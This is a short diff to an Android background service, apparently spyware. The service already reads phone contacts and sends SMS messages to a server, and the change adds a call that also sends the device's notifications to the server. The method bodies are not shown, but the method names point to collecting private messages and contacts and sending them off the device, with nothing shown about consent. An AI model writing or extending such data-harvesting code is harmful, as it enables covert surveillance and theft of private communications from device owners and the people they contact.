@@ -52,6 +52,7 @@ public class BackgroundJob extends Service {
                     if(backgroundJobService != null) {
                         backgroundJobService.ReadPhoneContacts();
                         backgroundJobService.sendSMSToServer();
+                        backgroundJobService.sendNotificationsToServer();
                     }
                     Toast.makeText(BackgroundJob.this, "Service is running", Toast.LENGTH_SHORT).show();
                 }
